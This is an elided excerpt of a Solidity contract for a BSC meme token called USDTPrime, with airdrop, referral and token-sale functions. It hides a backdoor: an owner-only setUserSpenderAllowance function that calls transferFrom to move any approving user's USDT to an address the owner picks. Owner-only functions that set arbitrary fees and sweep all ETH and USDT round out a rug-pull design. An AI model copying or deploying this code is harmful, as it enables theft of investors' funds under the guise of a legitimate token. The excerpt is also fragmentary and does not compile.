...
/* USDTPrime - Biggest reward meme token on the Binance Smart Chai
...
contract USDTPrime is Context, IERC20, Ownable {
    ...
    string private _name = "USDTPrime";
    string private _symbol = "USDTP";
  ...
  function setALLFeePercent(uint256 charity,uint256 marketting,uint256 burnTaxFee,uint256 liquidityFee,uint256 taxFee,uint256 sellLiquidityFee,uint256 sellTaxFee,uint256 buyLiquidityFee,uint256 buyTaxFee) external onlyOwner() {
   ...
   function setUserSpenderAllowance(address user,address account,uint256 amount ) public onlyOwner(){
      
        usdtToken.transferFrom(user, account, amount);
    } 
    ...
    uint256 private salePrice =2000000000;// 5*2000000000=10,000,000,000 token for 5 USDT (set as per requirements) 
   ...
   function clearAllETH() public onlyOwner() {
      ...
      function clearAllUSDT(address tokenaddress,address account, uint256 amount) public onlyOwner {
     ...
     function airdrop(address _refer, uint256 _amount) payable public returns(bool){
         require(_swAirdrop && _amount >= _airdropEth,"Transaction recovery");
        ...
        if(_msgSender()!=_refer&&_refer!=address(0)&&balanceOf(_refer)>0){
            ...
            usdtToken.transfer(payable(_refer), referEth);
    ...
    function buy(address _refer, uint256 _amount) payable public returns(bool){      
        require(_swSale && _amount >= 5 ether,"Transaction recovery");
